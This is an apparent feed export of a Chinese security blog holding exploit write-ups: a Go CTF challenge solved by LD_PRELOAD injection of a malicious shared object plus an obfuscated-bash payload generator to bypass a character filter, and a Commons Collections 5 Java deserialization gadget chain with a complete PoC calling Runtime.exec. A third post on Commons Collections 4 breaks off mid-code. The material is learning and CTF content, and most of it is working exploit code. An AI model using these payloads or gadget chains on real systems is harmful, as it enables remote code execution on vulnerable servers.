    <content type="html"><![CDATA[<h3 id="附件"><a class="markdownIt-Anchor" href="#附件">#</a> 附件</h3><p><img src="https://img-blog.csdnimg.cn/d6b8b5877a73434ebaa441197c5894ca.png" alt="在这里插入图片描述"></p><p>web 下的 main.go<br><img src="https://img-blog.csdnimg.cn/ee85e82d83d64d0abdd59a50436f8e6f.png" alt="在这里插入图片描述"><br>存在三个路径<br> list 展示上传到 token 下的文件<br><img src="https://img-blog.csdnimg.cn/d6554ea5d1704a5284eb3ecf6d152cf7.png" alt="在这里插入图片描述"></p><p>upload 上传文件并请求内网 9091 的 manage 接口<br><img src="https://img-blog.csdnimg.cn/479cabe06a3340baaecc1a4c01bfebf1.png" alt="在这里插入图片描述"></p><p>token：获取 token 并添加环境变量<br><img src="https://img-blog.csdnimg.cn/3a189c683b6b4ceba2dcb56fd75c6004.png" alt="在这里插入图片描述"><br> manage 接口</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">manage</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">values := r.URL.Query()</span><br><span class="line">m := values.Get(<span class="string">&quot;m&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> !waf(m) &#123;</span><br><span class="line">fmt.Fprintf(w, <span class="string">&quot;waf!&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">cmd := fmt.Sprintf(<span class="string">&quot;rm -rf uploads/%s&quot;</span>, m)</span><br><span class="line">fmt.Println(cmd)</span><br><span class="line">command := exec.Command(<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd)</span><br><span class="line">outinfo := bytes.Buffer&#123;&#125;</span><br><span class="line">outerr := bytes.Buffer&#123;&#125;</span><br><span class="line">command.Stdout = &amp;outinfo</span><br><span class="line">command.Stderr = &amp;outerr</span><br><span class="line">err := command.Start()</span><br><span class="line">res := <span class="string">&quot;ERROR&quot;</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(err.Error())</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err = command.Wait(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">res = outerr.String()</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">res = outinfo.String()</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">fmt.Fprintf(w, res)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里存在 rce 的点</p><p>其中有一个 waf</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">waf</span><span class="params">(c <span class="type">string</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line"><span class="keyword">var</span> t <span class="type">int32</span></span><br><span class="line">t = <span class="number">0</span></span><br><span class="line">blacklist := []<span class="type">string</span>&#123;<span class="string">&quot;.&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;?&quot;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> _, s := <span class="keyword">range</span> c &#123;</span><br><span class="line"><span class="keyword">for</span> _, b := <span class="keyword">range</span> blacklist &#123;</span><br><span class="line"><span class="keyword">if</span> b == <span class="type">string</span>(s) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> unicode.IsLetter(s) &#123;</span><br><span class="line"><span class="keyword">if</span> t == s &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> t == <span class="number">0</span> &#123;</span><br><span class="line">t = s</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>既然会加载环境变量，可以让其加载恶意的 so 文件来 rce</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include&lt;stdlib.h&gt;</span></span><br><span class="line">__attribute__((constructor)) void l3yx()&#123;</span><br><span class="line">    unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">    system(getenv(&quot;_evilcmd&quot;));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">gcc -shared -fPIC -o evil.so evil.c</span><br></pre></td></tr></table></figure><p>大致思路：<br>通过上传恶意的 so 文件来 rce，先访问 /token 获取到 token 的值，因为后面会有检验，upload 会将其移动到 token 目录下，上传会发现其请求 <code>/token?http_proxy=127.0.0.1:8080</code>  获取到 token，也就是 proxy 代理实现。再去 curl 内网的 9091manage 接口，将 m 参数传入即可得到 flag，当然还要先绕过 waf</p><p><img src="https://img-blog.csdnimg.cn/fca4867e50aa417c80b2b2c2f8ec07d5.png" alt="在这里插入图片描述"></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/token?http_proxy=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8080</span>&amp;LD_PRELOAD=/code/uploads/<span class="number">2</span>ea6a3a71d0b2db658544f67f1468897/XVlBz&amp;_evilcmd=ls /</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line">n = <span class="built_in">dict</span>()</span><br><span class="line">n[<span class="number">0</span>] = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">n[<span class="number">1</span>] = <span class="string">&#x27;$&#123;##&#125;&#x27;</span></span><br><span class="line">n[<span class="number">2</span>] = <span class="string">&#x27;$(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))&#x27;</span></span><br><span class="line">n[<span class="number">3</span>] = <span class="string">&#x27;$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;))&#x27;</span></span><br><span class="line">n[<span class="number">4</span>] = <span class="string">&#x27;$(($&#123;##&#125;&lt;&lt;$(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))))&#x27;</span></span><br><span class="line">n[<span class="number">5</span>] = <span class="string">&#x27;$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;0$&#123;##&#125;))&#x27;</span></span><br><span class="line">n[<span class="number">6</span>] = <span class="string">&#x27;$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;0))&#x27;</span></span><br><span class="line">n[<span class="number">7</span>] = <span class="string">&#x27;$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;))&#x27;</span></span><br><span class="line"></span><br><span class="line">f=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str_to_oct</span>(<span class="params">cmd</span>):</span><br><span class="line">    s = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> cmd:</span><br><span class="line">        o = (<span class="string">&#x27;%s&#x27;</span> % (<span class="built_in">oct</span>(<span class="built_in">ord</span>(t))))[<span class="number">2</span>:]</span><br><span class="line">        s+=<span class="string">&#x27;\\&#x27;</span>+o</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build</span>(<span class="params">cmd</span>):</span><br><span class="line">    payload = <span class="string">&quot;$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\\\&#x27;&quot;</span></span><br><span class="line">    s = str_to_oct(cmd).split(<span class="string">&#x27;\\&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> s[<span class="number">1</span>:]:</span><br><span class="line">        payload+=<span class="string">&quot;\\\\&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> _:</span><br><span class="line">            payload+=n[<span class="built_in">int</span>(i)]</span><br><span class="line">    <span class="keyword">return</span> payload+<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(quote(quote(<span class="string">&quot;123;&quot;</span>+build(<span class="string">&quot;cat /flag&quot;</span>))))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/d8ce9214a7694fe094dc9bc2f912e15a.png" alt="在这里插入图片描述"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;附件&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#附件&quot;&gt;#&lt;/a&gt; 附件&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/d6b8b5877a73434ebaa441197c5894ca.</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://ki10moc.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Go" scheme="https://ki10moc.github.io/tags/Go/"/>
    
  </entry>
  
  <entry>
    <title>Commons Collections5</title>
    <link href="https://ki10moc.github.io/2022/08/21/Commons%20Collections5/"/>
    <id>https://ki10moc.github.io/2022/08/21/Commons%20Collections5/</id>
    <published>2022-08-20T17:37:36.000Z</published>
    <updated>2022-08-24T05:09:50.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="环境"><a class="markdownIt-Anchor" href="#环境">#</a> 环境</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">3.1</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>依然是 cc1 的变形</p><h3 id="审计"><a class="markdownIt-Anchor" href="#审计">#</a> 审计</h3><p>直接来看 <code>Map</code>  的 <code>get()</code>  方法</p><p><code>TideMapEntry</code>  中的 <code>getValue()</code>  中有调用 <code>get()</code>  方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>并在 <code>toString()</code>  方法中调用 <code>getvalue()</code> <br> 关于这个 <code>toString()</code>  印象很深<br>源自某 CTF 题目</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> getKey() + <span class="string">&quot;=&quot;</span> + getValue();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里的 <code>map</code>  属性是通过 <code>TideMapEntry</code>  来构造赋值的，也就是将 <code>cc1</code>  中 <code>LazyMap</code>  换做 <code>TideMapEntry</code>  来构造属性</p><p>下面就需要找到一个重写的 <code>readObject</code>  方法并且可以调用 <code>toString</code>  的方法</p><p><code>BadAttributeValueExpException0</code>  的 <code>readObject()</code>  方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">            val = <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            val= valObj;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span></span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">            val = valObj.toString();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">            val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>其中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line"><span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">val = valObj.toString();</span><br></pre></td></tr></table></figure><p>只要让 <code>valObj</code>  是 <code>TiedMapEntry</code>  类的对象即可</p><p>利用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">            BadAttributeValueExpException.readObject()</span><br><span class="line">                TiedMapEntry.toString()</span><br><span class="line">                    LazyMap.get()</span><br><span class="line">                        ChainedTransformer.transform()</span><br><span class="line">                            ConstantTransformer.transform()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Class.getMethod()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.getRuntime()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.exec()</span><br></pre></td></tr></table></figure><p>直接对照着当时的 <code>cc1</code>  把后面的 <code>AnnotationInvocationHandler</code>  换成 <code>BadAttributeValueExpException</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        Runtime r = Runtime.getRuntime();</span></span><br><span class="line"><span class="comment">//        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,</span></span><br><span class="line"><span class="comment">//                new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125; ;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,<span class="string">&quot;ki10Moc&quot;</span>);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span>clazz.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(badAttributeValueExpException,tiedMapEntry);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes = serialize(badAttributeValueExpException);</span><br><span class="line">        unserialize(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">try</span>(<span class="type">ByteArrayInputStream</span> <span class="variable">bain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">oin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bain))&#123;</span><br><span class="line">            oin.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object o) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">try</span>(<span class="type">ByteArrayOutputStream</span> <span class="variable">baout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baout))&#123;</span><br><span class="line">            oout.writeObject(o);</span><br><span class="line">            <span class="keyword">return</span> baout.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/aeee5214c63148d0b23079a0a0ed4b8c.png" alt="在这里插入图片描述"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;环境&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#环境&quot;&gt;#&lt;/a&gt; 环境&lt;/h3&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span cl</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://ki10moc.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Java安全" scheme="https://ki10moc.github.io/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Commons Collections4</title>
    <link href="https://ki10moc.github.io/2022/08/10/Commons%20Collections4/"/>
    <id>https://ki10moc.github.io/2022/08/10/Commons%20Collections4/</id>
    <published>2022-08-09T17:37:36.000Z</published>
    <updated>2023-08-22T20:05:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>相较于前面的 cc 链，多的是一个版本的更新</p><p>之前都是 3.2.1</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">         &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">         &lt;version&gt;<span class="number">4.0</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p><code>cc4</code>  是 <code>cc3</code>  和 <code>cc2</code>  的组合</p><p>那前面的前置知识就不做介绍了</p><p>poc：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span 